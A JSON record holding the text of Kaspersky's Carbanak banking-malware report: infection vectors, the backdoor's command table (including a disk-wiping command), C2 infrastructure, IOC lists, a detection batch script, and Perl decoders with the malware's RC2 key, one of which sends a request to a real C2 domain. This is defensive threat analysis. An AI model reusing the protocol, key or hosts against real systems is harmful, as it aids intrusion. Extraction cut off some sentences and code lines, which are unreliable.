{
    "id": "43cba847-0983-46d9-9f3f-3505cb57a632",
    "created_at": "2022-10-25T16:48:18.162493Z",
    "updated_at": "2025-03-27T02:16:58.022232Z",
    "deleted_at": null,
    "sha1_hash": "99af231600ee8fd83b4b4fb057429e60cd9d21c4",
    "title": "Carbanak APT The Great Bank Robbery",
    "authors": "Kaspersky",
    "file_creation_date": "2015-02-15T14:50:58Z",
    "file_modification_date": "2015-02-15T14:51:22Z",
    "file_size": 3901614,
    "plain_text": "# CARBANAK APT THE GREAT BANK ROBBERY\n\nVersion 2.0\nFebruary, 2015\n\n[#TheSAS2015](http://sas.kaspersky.com/)\n[#Carbanak](https://twitter.com/hashtag/Carbanak)\n\n\n-----\n\n## Table of contents\n\n1. Executive Summary............................................................................................3\n\n2. Analysis................................................................................................................5\n\n2.1 Infection and Transmission.........................................................................5\n2.2 Malware Analysis – Backdoor.Win32.Carbanak.......................................7\n2.3 Lateral movement tools........................................................................... 18\n2.4 Command and Control (C2) Servers........................................................ 19\n\n3. Conclusions...................................................................................................... 23\n\nAPPENDIX 1: C2 protocol decoders..................................................................... 24\n\nAPPENDIX 2: BAT file to detect infection............................................................. 27\n\nAPPENDIX 3: IOC hosts........................................................................................ 28\n\nAPPENDIX 4: Spear phishing............................................................................... 34\n\nAPPENDIX 5: MD5 hashes of Carbanak samples.............................................. 36\n\n\n-----\n\n## 1. Executive Summary\n\nFrom late 2013 onwards, several banks and financial institutions have been\nattacked by an unknown group of cybercriminals. In all these attacks, a similar\nmodus operandi was used. According to victims and the law enforcement\nagencies (LEAs) involved in the investigation, this could result in cumulative\nlosses of up to 1 billion USD. The attacks are still active.\n\nThis report provides a technical analysis of these attacks.\n\nThe motivation for the attackers, who are making use of techniques commonly\nseen in Advanced Persistent Threats (APTs), appears to be financial gain as\nopposed to espionage.\n\nAn analysis of the campaign has revealed that the initial infections were\nachieved using spear phishing emails that appeared to be legitimate banking\ncommunications, with Microsoft Word 97 – 2003 (.doc) and Control Panel Applet\n(.CPL) files attached. We believe that the attackers also redirected to exploit kits\nwebsite traffic that related to financial activity.\n\nThe email attachments exploit vulnerabilities in Microsoft Office 2003, 2007 and\n2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-20141761). Once the vulnerability is successfully exploited, the shellcode decrypts\nand executes the backdoor known as Carbanak.\n\nCarbanak is a remote backdoor (initially based on Carberp), designed for\nespionage, data exfiltration and to provide remote access to infected machines.\nOnce access is achieved, attackers perform a manual reconnaissance of the\nvictim’s networks. Based on the results of this operation, the attackers use\ndifferent lateral movement tools in order to get access to the critical systems\nin the victim´s infrastructure. They then install additional software such as the\nAmmyy Remote Administration Tool, or even compromise SSH servers. Notably,\nsome of the latest versions of the analyzed Carbanak malware appear not to use\nany Carberp source code.\n\nOnce the attackers successfully compromise the victim´s network, the primary\ninternal destinations are money processing services, Automated Teller Machines\n(ATM) and financial accounts. In some cases, the attackers used the Society for\nWorldwide Interbank Financial Telecommunication (SWIFT) network to transfer\nmoney to their accounts. In others, Oracle databases were manipulated to open\npayment or debit card accounts at the same bank or to transfer money between\n\n\n-----\n\naccounts using the online banking system. The ATM network was also used to\ndispense cash from certain ATMs at certain times where money mules were ready\nto collect it.\n\nAs part of the attack´s reconnaissance phase, video recordings of the activities of\nbank employees, particularly system administrators, were made. The videos were\nsent to the C2 server.\n\nPlease note that the attackers abused the aforementioned services by\nimpersonating legitimate local users who had the permissions to perform the\nactions later reproduced by the cybercriminals. As far as we know, none of the\naforementioned services were attacked nor was any specific vulnerability within\nthem exploited.\n\nOf the 100 banking entities impacted at the time of writing this report, at least\nhalf have suffered financial losses, with most of the victims located in Russia,\nUSA, Germany, China and Ukraine. The magnitude of the losses is significant.\nFor example, one victim lost approximately $7.3 million (USD) due to ATM fraud;\nanother suffered a $10 million (USD) loss due to the exploitation of its online\nbanking platform.\n\nStolen funds were transferred out of the affected countries to bank accounts in\nthe US and China. Additionally some of the C2 servers have log entries indicating\nconnections to systems located in the US. Telemetry indicates that the attackers\nare expanding operations to other regions, such as Asia, the Middle-East, Africa\nand Europe.\n\nThis report discusses the attack vectors, infection mechanisms and toolkits used\nby the attackers to exploit the network after the initial infection, as well as the\noperational details and geographical distribution of this campaign.\n\n\n-----\n\n## 2. Analysis\n\nDuring the spring of 2014, Kaspersky Lab was involved in a forensic analysis\nof ATMs dispensing cash to people located near them but with no physical\ninteraction according to security cameras. No malware was detected on these\nATMs. However, Carberp-like malware was found on a computer that was\nconnected to them via VPN.\n\nFollowing the investigation of this incident, in the summer of 2014, Kaspersky\nLab identified the same Carberp-like malware in another investigation involving\na bank, where criminals were able to gain access to its online banking systems.\nIn this investigation, we started analyzing all the computers in the bank’s\ninfrastructure in order to find the source of the infection. We found spear phishing\nemails with CPL files attached that, after a successful infection, install the same\nCarberp-like malware we had previously found in the case involving the ATMs.\n\nThere is evidence indicating that in most cases the network was compromised\nfor between two to four months, and that many hundreds of computers within a\nsingle victim organization may have been infected. This period of time was used\nby the attackers to get access to the right victims and critical systems, and to\nlearn how to operate their tools and systems to get the cash out.\n\nCarbanak contains an espionage component that allows the attackers to take\ncontrol of video capabilities on the victim systems. Thanks to this, long term\nobservation and reconnaissance could be conducted. This allowed the attackers\nto understand the protocols and daily operational tempo of their targets. Based\non this understanding, exploitation methodologies and mechanisms were\ndeveloped and tailored to each victim.\n\n### 2.1 Infection and Transmission\n\nAll observed cases used spear phishing emails with Microsoft Word 97 – 2003\n(.doc) files attached or CPL files. The doc files exploit both Microsoft Office (CVE2012-0158 and CVE-2013-3906) and Microsoft Word (CVE- 2014-1761).\n\nThere are indicators that point to a possible Chinese origin for the exploits used\nin these attachments. Command and Control (C2) servers located in China have\nbeen identified in this campaign. In addition, registration information for some of\nthe domains use details of supposedly Chinese citizens. Obviously, all this could\njust be a red herring.\n\n\n-----\n\nThe targets were all employees affiliated to the affected institution. The spear\nphishing email messages appeared legitimate and in some cases were sent from\ncompromised coworkers´ accounts. In this way compromised systems were used\nas a transmission vector.\n\nGiven that the victims were mostly Russian-speaking financial institutions,\nthe names of the attachments we have identified were generally in Russian.\nExamples include “Соответствие ФЗ-115” and “Приглашение” which translate\ninto “Accordance to Federal Law” and “Invitation” respectively. This is enough to\ninduce a typical employee to open the attachment and execute the malware. For\na complete list of file names see Appendix 4.\n\nThe following is an example of a Carbanak spear phishing email:\n\nTranslated:\n\nIn this case, the attachment was a CPL file compressed using the Roshal Archive\n(.rar) format.\n\nOnce the remote code execution vulnerability is successfully exploited, it installs\nCarbanak on the victim's system. The complete list of observed spear phishing\nemails can be found in Appendix 1 – Spear phishing.\n\nAn additional infection vector that we believe was used by the criminals is\na classical drive-by-download attack. We have found traces of the Null and\nthe RedKit exploits kits.\n\n\n-----\n\nFigure 1. Null Exploit Kit – statistics on victims, found in one Carbanak C2\n\nThe image above translates as Country_name, All visitors, Unique visitors,\nBanned visitor, Revoked infections, Infected.\n\n### 2.2 Malware Analysis – Backdoor.Win32.Carbanak\n\nCarbanak is a backdoor used by the attackers to compromise the victim's machine\nonce the exploit, either in the spear phishing email or exploit kit, successfully\nexecutes its payload. This section provides a functional analysis of Carbanak’s\ncapabilities.\n\nCarbanak copies itself into “%system32%\\com” with the name “svchost.exe” with\nthe file attributes: system, hidden and read-only. The original file created by the\nexploit payload is then deleted.\n\nTo ensure that Carbanak has autorun privileges the malware creates a new\nservice. The naming syntax is “<ServiceName>Sys” where ServiceName is any\nexisting service randomly chosen, with the first character deleted. For example,\nif the existing service´s name is “aspnet” and the visible name is “Asp.net state\n\n\n-----\n\nservice”, the service created by the malware would be “aspnetSys” with a visible\nname of “Sp.net state service”.\n\nBefore creating the malicious service, Carbanak determines if either the avp.exe\nor avpui.exe processes (components of Kaspersky Internet Security) is running.\nIf found on the target system, Carbanak will try to exploit a known vulnerability\nin Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008,\nWindows 7, Windows 8, and Windows Server 2012, CVE-2013-3660, for local\nprivilege escalation. We believe this is not relevant and that the attackers adapt\ntheir tools to the victim´s defenses.\n\nCarbanak creates a file with a random name and a .bin extension in\n%COMMON_APPDATA%\\Mozilla where it stores commands to be executed.\n\nThen the malware gets the proxy configuration from the registry entry:\n\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings]\n\nand the Mozilla Firefox configuration file in:\n\n%AppData%\\Mozilla\\Firefox\\<ProfileName>\\prefs.js\n\nHow to detect Carbanak\n\nOne of the best methods for detecting Carbanak is to look for .bin files in the\nfolder:\n\n..\\All users\\%AppData%\\Mozilla\\\n\nThe malware saves files in this location that will later be sent to the C2 server\nwhen an internet connection is detected.\n\nA .BAT script for detecting infections is provided in the Appendixes.\n\nAdditionally, Carbanak can obtain proxy configuration information from headers\nsent through an application via SOCKS or HTTP.\n\nCarbanak injects its code into svchost.exe. Most of the actions described below\nhappen within this process.\n\nCarbanak downloads the file kldconfig.plug from its C2 server. This file includes\nthe names of the processes to be monitored.\n\nOnce the system is infected, Carbanak logs keystrokes and takes screenshots\nevery 20 seconds. This monitoring is performed by intercepting the\n\n\n-----\n\nTo enable connections to the infected computer using the Remote Desktop\nProtocol (RDP), Carbanak sets Termservice service execution mode to Auto. Also,\nafter executing this service, it modifies the executable code in memory in order to\nestablish simultaneous work processes for both remote and local users. Modules\nmodified in this process are: termsrv.dll, csrsrv.dll, msgina.dll and winlogon.exe.\n\nIf Carbanak detects the banking application BLIZKO (funds transfer software) in\nthe infected computer, it sends a special notification to its C2 server. Carbanak\nis also aware of the IFOBS banking application and can, on command, substitute\nthe details of payment documents in the IFOBS system.\n\nTo communicate with its C2 server, Carbanak uses the HTTP protocol with\nRC2+Base64 encryption, adding additional characters not included in Base64.\nIt also inserts strings with different extensions (.gif,.htm, etc.) at random locations\nin the HTTP request.\n\nExample of a typical Carbanak request:\n\nCarbanak sends its collected monitoring data to its C2 server. It also receives\ncommands. The commands are compared with a hash table; if there is a match\nCarbanak performs the associated action:\n\nHash Command Description\n\n0AA37987 Executes all commands stored in the configuration file.\n\n7AA8A5 state Sets malware state flag.\n\n7CFABF video Sends captured screen or process window video to C2.\n\n6E533C4 download Downloads and runs executable file from C2. Executable file is\nstored in %TEMP% with a random name.\n\n684509 ammyy Downloads and run “Ammy Admin” remote control software and\nadds it to the system´s firewall exclusion list.\n\n7C6A8A5 update Malware update.\n\n0B22A5A7 Monitoring configuration update («klgconfig.plug»).\n\n0B77F949 Unknown.\n\n\n-----\n\nHash Command Description\n\n7203363 killos Kills the operating system through the following actions:\n\n1- Puts in «ImagePath» registry [HKLM\\SYSTEM\\ControlSet001\\\nservices\\ACPI], [HKLM\\SYSTEM\\ControlSet002\\services\\ACPI]\nand [HKLM\\SYSTEM\\CurrentControlSet\\services\\ACPI] bad data.\n\n2- Writes bytes with value zero into the first 512 bytes of hardrive\n«\\\\.\\PHYSICALDRIVE0».\n\nThen reboots.\n\n78B9664 reboot OS reboot.\n\n7BC54BC tunnel Creates network tunnel to specified network address, routing all\ntraffic there.\n\n7B40571 adminka Uses specified proxy settings.\n\n79C9CC2 server Changes C&C server.\n\n7C9C2 user Creates or deletes user.\n\n78B0 rdp Modifies “termsrv.dll”, “csrsrv.dll, “msgina.dl” and “winlogon.\nexe” modules. Modification allows multiple connections via RDP\nprotocol and makes RDP persistent.\n\n79BAC85 secure Loads and overwrites .dll responsible for passwords policy. New\n.dll location points to «Notification Packages» [HKLM\\ System\\\nCurrentControlSet\\Control\\Lsa] registry key.\n\n6ABC del Deletes specified service or file.\n\n0A89AF94 Executes specified command hash.\n\n79C53BD Loads and executes file from specified network location. File\nexecutes in memory and is not stored on the harddrive.\n\n0F4C3903 Sends local user system password to C2.\n\n0BC205E4 screenshot Creates and sends screenshots.\n\n7A2BC0 sleep Turns off malware activity for a specified period of time.\n\n6BC6C dupl Unknown.\n\n4ACAFC3 Uploads specified file or directory.\n\n7D43 vnc Establish VNC session.\n\n9C4D055 Unknown.\n\n2032914 Unknown.\n\n\n-----\n\nIn order to render the malware less suspicious, the latest Carbanak samples\nare digitally signed:\n\n1. footprintcrsgn.dll\n\nMD5 08F83D98B18D3DFF16C35A20E24ED49A\n\nFigure 2. Carbanak digital signature\n\n\n-----\n\n2. PAExec_Move0.dat\n\nMD5 972092CBE7791D27FC9FF6E9ACC12CC3\n\nFigure 3. Carbanak digital signature\n\n\n-----\n\nOne of Carbanak’s lateral movement tools is also digitally signed:\n\n3. PAExec-6980-PB-FS-01.ex_\n\nMD5 86A5C466947A6A84554843D852478248\n\nFigure 4. Carbanak lateral movement tool digital signature\n\n\n-----\n\n#### Geographical Distribution\nKnown samples of Carbanak have been uploaded to VirusTotal from the following\nlocations:\n\nFigure 5. Countries from which Carbanak has been uploaded\n\nKnown exploits that download Carbanak have been uploaded to VirusTotal mostly\nfrom Russia.\n\n\n-----\n\nAccording to KSN data, victims are distributed geographically as follows:\n\nFigure 6. Geographical distribution of victims according to KSN data\n\nThe analyzed Carbanak samples, excluding some obvious outliers, have\nthe following compilation time distribution:\n\nFigure 7. Carbanak compilation timestamp distribution\n\n\n-----\n\nIt is also very interesting to see the distribution of Carbanak submissions to\nVirusTotal. This way we can identify periods when the malware came to the\nattention of potential victims and security researchers, and helps to reveal\npeaks in the group’s activity:\n\nFigure 8. Distribution of Carbanak submissions to VirusTotal\n\nSince the beginning of this case, Kaspersky Lab has worked in cooperation with\nthe LEAs investigating it. During the investigation LEAs shared with us statistical\ndata from their research that helped us to complete our picture of the campaign.\n\n\n-----\n\nThe following map shows targets’ IP addresses found in three of Carbanak’s\nLinux servers at the end of October 2014:\n\nFigure 9. Geographical distribution of targets according to C2 data\n\n\n-----\n\nFigure 10. Geographical distribution of victims according to C2 data\n\n### 2.3 Lateral movement tools\n\nCarbanak uses different tools on infected systems, each one with a different\npurpose. There appears to be a preference for the Ammyy Admin remote\nadministration tool for remote control. Specifically, the attackers have been\ndetected uploading:\n\nAmmyy Admin 3.5 (f8cd52b70a11a1fb3f29c6f89ff971ec) as svchost.exe\n\nIt is believed that the attackers used this remote administration tool because\nit is commonly whitelisted in the victims’ environments as a result of being\nused regularly by administrators.\n\nIn another instance, a Secure Shell (SSH) backdoor was used to communicate\nwith the C2 server in 190.97.165.126 (operatemesscont.net).\n\nThis indicates that the attackers did not limit themselves to Microsoft Windows\nenvironments. In this case, the victim used the Telnet/SSH client PuTTY to\nconnect to the server, and the attackers recompiled the machine’s SSH daemon\nwith a backdoor so they could gain direct access.\n\nLogs for these tools indicate that they were accessed from two different IPs,\nprobably used by the attackers, and located in Ukraine and France.\n\nWe have also found traces of many different tools used by the attackers inside\nthe victim´s network to gain control of additional systems, such as Metasploit,\n\n\n-----\n\n### 2.4 Command and Control (C2) Servers\n\nThere appear to be four distinct types of C2 servers:\n\n- Linux servers used for issuing commands to deployed Carbanak instances\n\nand for receiving collected monitoring data;\n\n- Windows servers used for remote connections to victim systems;\n\n- Backup servers; and\n\n- Drop servers where additional executable files (e.g. remote administration\n\ntools) are hosted.\nServer rotation occurs more or less on a biweekly basis. For a complete list of\nidentified Carbanak servers please check the regularly updated Carbanak IOC\ndocument. The current list of IOCs is provided at Appendix 3 in his document.\n\nSome of these C2 servers are responsible for dropping Ammyy (configuration\nand executable files), the KLG plugin configuration (list of processes to monitor)\nand the VNC server (both 32 and 64 bits to be injected in rundll). In one of the\nobserved servers there was also a Metasploit module.\n\nFigure 11. Carbanak administration panel running in Linux\n\n\n-----\n\nFigure 12. Carbanak administration panel running in Linux, list of plugins\n\nFigure 13. Carbanak administration panel running in Windows able to run RDP,\n\nVNC, proxy and tunnels via Carbanak\n\nVictim systems are catalogued in the servers’ databases. The victims belong\nto a number of different communities, thus simplifying administration. In all,\n85 different victims belonging to seven communities were found.\n\n\n-----\n\n#### Attacker´s operational details\nAdditionally, the malicious servers contain video files that capture a victim´s\nactivity. While the videos are stored using a compressed format which provides\npoor image quality, the selected format minimizes upload bandwith and is of\nsufficient quality for the attackers to understand the victims’ activities.\n\nThe video file naming conventions used the name of the application in the\nforeground (e.g., Outlook, Cmd, etc.) and only recorded user activity. This helped\nthe attackers to both navigate to files of interest and to discard superfluous files.\n\nFigure 14. Special video player designed to watch Carbanak´s video stream\n\nUsing the intelligence gained from video and other monitoring techniques, the\nattackers developed an operational picture of the victim's workflow, tooling and\npractices. This picture helps the attackers to deploy their malicious operations,\nfor example:\n\n- Attackers created fake transactions in the victim’s internal database after\n\nthe verification process, thus avoiding discovery of the fraudulent activity;\n\n- Attackers used the victim’s internal command utilities to insert fraudulent\n\noperations in the transaction queue.\nIn general, the attackers demonstrated great versatility, using attack\nmethodologies best suited to a specific victim’s operational methodology.\nHowever, they seemed to deliberately limit the amount of money stolen per\nvictim to $10 million USD. This limit may be explained as the maximum amount\n\n\n-----\n\nof money that can be transferred via mule services, or the maximum amount of\nmoney that is budgeted in banks for fraud risks in order to minimize the chances\nof LEAs and the bank´s anti-fraud teams from doing a full blown analysis.\n\nFigure 15. List of PIN KVC used on ATMs\n\nSensitive bank documents have be found on the servers that were controlling\nCarbanak. They included classified emails, manuals, crypto keys, passwords\nand so on. For example, the file in the above figure has KVC (key verification codes)\nkeys that are used by ATMs to check the integrity of the PIN numbers of its users.\n\nIn other cases involving ATMs, the criminals were able to control computers that\nhad access to the internal ATM network. If the bank had enabled remote access\nto ATMs, the criminals started using this access to remotely withdraw cash.\nCriminals used no malware to operate the ATM dispenser; instead they used\n\n\n-----\n\n## 3. Conclusions\n\nMalware targeting the finance industry (both companies and consumers)\ncontinues to evolve. The Carbanak malware used in the on-going campaign\ndescribed in this report has been very successful in terms of generating\nrevenue. Of particular interest are the attack methods, similar to those used\nin sophisticated cyber-espionage APTs. As such, they represent a new and\ndisturbing trend in the cybercrime market of increasing attack sophistication.\n\nDespite increased awareness of cybercrime within the financial services sector,\nit appears that spear phishing attacks and old exploits (for which patches have\nbeen disseminated) remain effective against larger companies. Attackers always\nuse this minimal effort approach in order to bypass a victim´s defenses.\n\nAdvanced control and fraud detection systems have been used for years by the\nfinancial services industry. However, these focus on fraudulent transactions within\ncustomer accounts. The Carbanak attackers bypassed these protections, by for\nexample, using the industry-wide funds transfer (the SWIFT network), updating\nbalances of account holders and using disbursement mechanisms (the ATM network).\n\nIn neither of these cases did the attackers exploit a vulnerability within the\nservice. Instead, they studied the victim´s internal procedures and pinpointed\nwho they should impersonate locally in order to process fraudulent transactions\nthrough the aforementioned services.\n\nIt is clear that the attackers were very familiar with financial services software\nand networks. As part of an automated reconnaissance phase, the Carbanak\nmalware checked victim systems for the presence of specialized and specific\nbanking software. Only after the presence of banking systems was confirmed,\nwere victims further exploited. To date, attacks against approximately 300 IP\naddresses around the world have been observed on analyzed C2s. It is possible\nthat these attacks were coordinated to maximize returns prior to industry-wide\ninformation sharing and the implementation of countermeasures.\n\nExisting telemetry indicates that the Carbanak attackers are trying to expand\noperations to other Baltic and Central Europe countries, the Middle East, Asia\nand Africa. Carbanak may be responsible for losses as high as $1 billion USD.\n\nWe believe that the Carbanak campaign is a clear indicator of a new era in\ncybercrime in which criminals use APT techniques directly against the financial\nindustry instead of through its customers. APTs are not only for stealing\ninformation anymore\n\n\n-----\n\n## APPENDIX 1: C2 protocol decoders\n#### Decryptor\n```\n #!/usr/bin/perl -w\n #Work with Carbanak c2\n use strict;\n use warnings; use Crypt::CBC;\n use Crypt::Cipher::RC2;\n use MIME::Base64; use LWP::Simple;\n #my $c2 = \"worldnewsonline.pw\";\n #my $reguest = \"1234567890123456\";\n my $reguest_was = \"JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7m8a19tz\n QwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKf MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK\n tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V fyUz.shtml\";\n $reguest_was =~ tr/\\/\\=\\&\\?//d; my $replace = \"\";\n\n```\nmy $find=\".shtml\";\n$reguest_was =~ s/\\Q$find\\E//g;\n```\n $reguest_was =~ s/-/+/g;\n $reguest_was =~ s/\\./\\//g; print \"$reguest_was\\n\";\n my $iv = substr $reguest_was,0,8;\n $reguest_was = substr $reguest_was,8;\n my $base64_decoded1 = decode_base64(\"$reguest_was\");\n\n print \"$base64_decoded1\\n\";\n my $length = length($base64_decoded1); print \"length is: $length\\n\";\n print \"iv is: $iv\\n\";\n print \"req is: $reguest_was\\n\";\n my $base64_decoded = \"${base64_decoded1}\";\n\n my $key = \"vfDGbiwmiqdN6E2N\";\n #my $key = \"1234567812345678\";\n my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none',\n -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv );\n my $plaintext = $cipher->decrypt($base64_decoded); print \"Decode:\\\n n$plaintext\\n\";\n #Decrypt is\n #HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro\n cess=svchost.exe|idproce ss=4294967295|lBHReFDRDfYG\n #my $url = \"http://$c2/$base64_encoded\";\n #print $url;\n #my $contents = get($url);\n\n```\n\n-----\n\n#### Encryptor\n```\n #!/usr/bin/perl -w\n #Decrypt Carbanak c2 responce\n\n use strict;\n use warnings; use Crypt::CBC;\n use Crypt::Cipher::RC2; use MIME::Base64;\n use LWP::Simple;\n my $c2 = \"worldnewsonline.pw\"; my $reguest =\n \"HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro\n cess=svchost.exe|idproces s=4294967295|lBHReFDRDfYG\";\n my $iv = \"JybDHkfW\"; #should be random my $key = \"vfDGbiwmiqdN6E2N\";\n my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none',\n -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv );\n my $ciphertext = $cipher->encrypt($reguest);\n my $base64_encoded = encode_base64(\"$ciphertext\");\n $base64_encoded =~ s/\\x0a//g;\n $base64_encoded =~ s/\\//\\./g;\n $base64_encoded =~ s/\\+/-/g;\n my $base64_encoded_ex = \"${iv}${base64_encoded}.php\"; my $url =\n \"http://$c2/${base64_encoded_ex}\";\n print $url;\n #http://worldnewsonline.pw/\n GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp ZGp.\n dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG\n ZCBPj.vd08D UENC5o.AE4VfyUz..php|\n my $contents = get($url); print $contents;\n\n```\n\n-----\n\n#### Decrypt Files from CnC\n```\n #!/usr/bin/perl -w\n #Decrypt Files from sended from c2\n use strict;\n use warnings; use Crypt::CBC;\n use Crypt::Cipher::RC2;\n use MIME::Base64; use LWP::Simple;\n\n```\nmy $file=$ARGV[0]; open(DATA, \"<$file\"); open(DATA1, \"<$file\");\nopen(DATA2, \"<$file\"); binmode(DATA); binmode(DATA1); binmode(DATA2);\n```\n my ($data, $n, $offset);\n while (($n = read DATA, $data, 1, $offset) != 0) { $offset += $n; } my\n $length = $offset;\n my $iv_len = read DATA1, my $iv, 8, 0; read DATA2, my $crypt_data,\n $length, 8; my $key = \"vfDGbiwmiqdN6E2N\";\n my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none',\n -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv );\n my $plaintext = $cipher->decrypt($crypt_data); print \"$plaintext\";\n\n```\n\n-----\n\n## APPENDIX 2: BAT file to detect infection\n```\n@echo off\nfor /f %%a in ('hostname') do set \"name=%%a\" echo %name%\ndel /f %name%.log 2> nul\nif exist \"c:\\Documents and settings\\All users\\application data\\\n      mozilla\\*.bin\" echo \"BIN detected\" >> %name%.log\nif exist %SYSTEMROOT%\\System32\\com\\svchost.exe echo \"COM\n      detected\" >> %name%.log\nif exist \"c:\\ProgramData\\mozilla\\*.bin\" echo \"BIN2 detected\"\n>> %name%.log\nif exist %SYSTEMROOT%\\paexec* echo \"Paexec detected\"\n>> %name%.log\nif exist %SYSTEMROOT%\\Syswow64\\com\\svchost.exe echo \"COM64\n      detected\" >> %name%.log\n\n```\nSC QUERY state= all | find \"SERVICE_NAME\" | findstr \"Sys$\"\n\nif q%ERRORLEVEL% == q0 SC QUERY state= all | find\n\"SERVICE_NAME\" | findstr \"Sys$\" >> %name%.log\n```\nif not exist %name%.log echo Ok > %name%.log xcopy /y %name%.log\n\n```\n\"\\\\<IP>\\logVirus\n\n\n-----\n\n## APPENDIX 3: IOC hosts\n\n\nIP/Domain name\n\n\nFirst\nseen in Type\n\n\n108.61.197.254 2014-07 Carbanak’s\n\nLinux CnC\n\n112.78.3.142 2014-10 Related to\n\nCarbanak\n\n118.163.216.107 2014-10 Related to\n\nCarbanak\n\n131.72.138.18 2014-11 Carbanak’s\n\nLinux CnC\n\n141.60.162.150 2014-10 Related to\n\nCarbanak\n\n146.185.220.200 2014-08 Carbanak’s\n\nLinux CnC\n\n162.221.183.109 2014-12 Carbanak’s\n\nWindows\nbackconnect\n\n162.221.183.11 2014-12 Carbanak’s\n\nWindows\nbackconnect\n\n173.201.45.158 2014-10 Related to\n\nCarbanak\n\n173.237.187.203 2014-08 RedKit\n\nExploitKit\n\n174.143.147.168 2014-10 Related to\n\nCarbanak\n\n185.10.56.59 2014-08 Carbanak’s\n\nWindows\nbackconnect\n\n185.10.56.59:443 2014-07 Carbanak’s\n\nWindows\nbackconnect\n\n185.10.58.175 2014-07 Carbanak’s\n\nLinux CnC\n\n188.138.16.214 2014-10 Related to\n\nCarbanak\n\n188.138.98.105 2014-10 Carbanak’s\n\nWindows\n\n\nSource: Sample md5/Detection name/\nSystem Comment\n\n1046652E0AAA682F89068731FA5E8E50\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nInternet scan\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs\n\n1684a5eafd51852c43b4bca48b58980f\n\n1684a5eafd51852c43b4bca48b58980f\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs Exploits drop zone\nthat used to install\nCarbanak\n\nCnC of other malware\nused to install\nCarbanak\n\n551d41e2a4dd1497b3b27a91922d29cc\n\n4afafa81731f8f02ba1b58073b47abdf\n\n4afafa81731f8f02ba1b58073b47abdf IP of\nfinancialnewsonline.\npw\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\n0AD4892EAD67E65EC3DD4C978FCE7D92\n\n\n-----\n\nIP/Domain name\n\n\nFirst\nseen in Type\n\n\n188.40.224.76 2014-10 Related to\n\nCarbanak\n\n190.97.165.126 2014-08 Related to\n\nCarbanak\n\n194.44.218.102 2014-10 Related to\n\nCarbanak\n\n195.113.26.195 2014-11 Related to\n\nCarbanak\n\n198.101.229.24 2014-10 Related to\n\nCarbanak\n\n199.255.116.12 2014-10 Related to\n\nCarbanak\n\n199.79.62.69 2014-07 Related to\n\nCarbanak\n\n204.227.182.242 2014-10 Related to\n\nCarbanak\n\n208.109.248.146 2014-10 Related to\n\nCarbanak\n\n209.222.30.5 2014-07 Carbanak’s\n\nWindows\nbackconnect\n\n216.170.117.7 2015-02 Carbanak´s\n\nLinux Cnc\n\n216.170.117.88 2015-02 Carbanak´s\n\nLinux CnC\n\n217.172.183.184 2014-10 Related to\n\nCarbanak\n\n217.172.186.179 2014-10 Carbanak’s\n\nLinux CnC\n\n218.76.220.106 2014-10 Related to\n\nCarbanak\n\n31.131.17.79 2014-09 Carbanak’s\n\nplugin CnC\n\n31.131.17.81 2014-09 Carbanak’s\n\nplugin CnC\n\n\nSource: Sample md5/Detection name/\nSystem Comment\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs Ip of SSHD backdoor\ninstalled after\nCarbanak's infection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs Exploits used to install\nCarbanak\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\n1046652E0AAA682F89068731FA5E8E50\n\n6ae1bb06d10f253116925371c8e3e74b\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\nVictim's logs\n\nVictim's logs CnC of other malware\nused to install\nCarbanak\n\nVictim's logs\n\nVictim's logs CnC of other malware\nused after Carbanak's\ninfection\n\n\n32dsffds8743jsdf 2014-10 Carbanak’s 08f83d98b18d3dff16c35a20e24ed49a\n\n\n-----\n\nIP/Domain name\n\n\nFirst\nseen in Type\n\n\n37.235.54.48 2014-10 Related to\n\nCarbanak\n\n37.46.114.148 2014-10 Carbanak’s\n\nLinux CnC\n\n37.59.202.124 2014-12 Carbanak’s\n\nLinux CnC\n\n5.101.146.184 2014-10 Carbanak’s\n\nLinux CnC\n\n5.135.111.89 2015-02 Carbanak´s\n\nWindows\nbackconnect\n\n5.61.32.118 2014-10 Carbanak’s\n\nWindows\nbackconnect\n\n5.61.38.52 2014-10 Carbanak’s\n\nWindows\nbackconnect\n\n50.115.127.36 2014-10 Related to\n\nCarbanak\n\n50.115.127.37 2014-10 Related to\n\nCarbanak\n\n55.198.6.56 2014-10 Related to\n\nCarbanak\n\n61.7.219.61 2014-10 Related to\n\nCarbanak\n\n62.75.224.229 2014-10 Related to\n\nCarbanak\n\n66.55.133.86 2014-10 Carbanak’s\n\nLinux CnC\n\n67.103.159.140 2014-08 Related to\n\nCarbanak\n\n69.64.48.125 2014-10 Related 